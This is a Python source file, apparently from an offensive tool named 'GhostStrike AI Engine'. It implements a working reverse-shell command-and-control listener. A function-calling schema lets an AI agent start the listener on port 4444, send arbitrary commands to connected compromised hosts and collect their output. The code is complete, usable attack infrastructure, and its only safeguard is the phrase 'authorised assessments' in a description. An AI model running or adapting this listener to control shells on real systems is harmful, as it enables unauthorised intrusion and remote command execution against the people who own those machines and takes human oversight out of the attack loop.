"""
GhostStrike AI Engine — C2 Listener
=====================================
A background reverse-shell listener the AI agent can control
programmatically: start/stop, send commands, and retrieve output
history — all without blocking the main agent loop.

Copyright (C) 2026 Fouad Ailabouni. All rights reserved.
"""

from __future__ import annotations

import socket
import threading
from typing import Dict, List, Optional

TOOL_SCHEMA: Dict = {
    "type": "function",
    "function": {
        "name": "c2_listener",
        "description": (
            "Manage a reverse shell listener for authorised assessments. "
            "Actions: start (begin listening), stop (close listener), "
            "send_command (execute command on connected shell), "
            "get_history (retrieve all received output)."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["start", "stop", "send_command", "get_history", "status"],
                },
                "host":    {"type": "string", "description": "Listener bind address (default 0.0.0.0).", "default": "0.0.0.0"},
                "port":    {"type": "integer", "description": "Listener port (default 4444).", "default": 4444},
                "command": {"type": "string", "description": "Command to send to connected reverse shell."},
            },
            "required": ["action"],
        },
    },
}


class C2Listener:
    """
    Python reverse shell listener managed by AI agents.

    Runs in a daemon thread so it never blocks agent execution.
    The agent polls ``get_history`` to retrieve shell output.
    """

    def __init__(self) -> None:
        self._host:            str              = "0.0.0.0"
        self._port:            int              = 4444
        self._socket:          Optional[socket.socket] = None
        self._client_socket:   Optional[socket.socket] = None
        self._listener_thread: Optional[threading.Thread] = None
        self._running:         bool             = False
        self._history:         List[str]        = []

    # ── Public API ────────────────────────────────────────────────────────────

    def operate(
        self,
        action: str,
        host: str = "0.0.0.0",
        port: int = 4444,
        command: Optional[str] = None,
    ) -> str:
        action = action.lower()
        if action == "start":
            return self.start(host, port)
        if action == "stop":
            return self.stop()
        if action == "send_command":
            return self.send_command(command or "whoami")
        if action == "get_history":
            return self.get_history()
        if action == "status":
            return self.status()
        return f"Unknown action '{action}'."

    def start(self, host: str = "0.0.0.0", port: int = 4444) -> str:
        if self._running:
            return f"Listener already running on {self._host}:{self._port}."
        self._host    = host
        self._port    = port
        self._running = True
        try:
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._socket.bind((host, port))
            self._socket.listen(1)
        except OSError as exc:
            self._running = False
            return f"Error binding to {host}:{port} — {exc}"

        self._listener_thread = threading.Thread(
            target=self._accept_loop, daemon=True
        )
        self._listener_thread.start()
        return (
            f"C2 listener started on {host}:{port}\n"
            f"Waiting for incoming reverse shell connection…\n"
            f"Call get_history to retrieve shell output."
        )

    def stop(self) -> str:
        self._running = False
        if self._client_socket:
            try:
                self._client_socket.close()
            except Exception:
                pass
            self._client_socket = None
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None
        return "C2 listener stopped."

    def send_command(self, command: str) -> str:
        if not self._client_socket:
            return "Error: no reverse shell connected."
        try:
            self._client_socket.send((command + "\n").encode())
            return f"Command sent: {command}"
        except OSError as exc:
            return f"Error sending command: {exc}"

    def get_history(self) -> str:
        if not self._history:
            return "No output received yet."
        return "".join(self._history)

    def status(self) -> str:
        connected = "Connected" if self._client_socket else "Waiting"
        running   = "Running" if self._running else "Stopped"
        return (
            f"Listener: {running}\n"
            f"Address:  {self._host}:{self._port}\n"
            f"Shell:    {connected}\n"
            f"History:  {len(self._history)} entries"
        )

    # ── Internal ──────────────────────────────────────────────────────────────

    def _accept_loop(self) -> None:
        self._socket.settimeout(1.0)
        while self._running:
            try:
                client, addr = self._socket.accept()
                self._client_socket = client
                self._history.append(f"\n[+] Connection from {addr[0]}:{addr[1]}\n")
                self._receive_loop(client)
            except socket.timeout:
                continue
            except Exception:
                break

    def _receive_loop(self, client: socket.socket) -> None:
        while self._running:
            try:
                data = client.recv(4096)
                if not data:
                    break
                decoded = data.decode("utf-8", errors="replace")
                self._history.append(decoded)
            except Exception:
                break
        self._client_socket = None
        self._history.append("\n[-] Shell disconnected.\n")
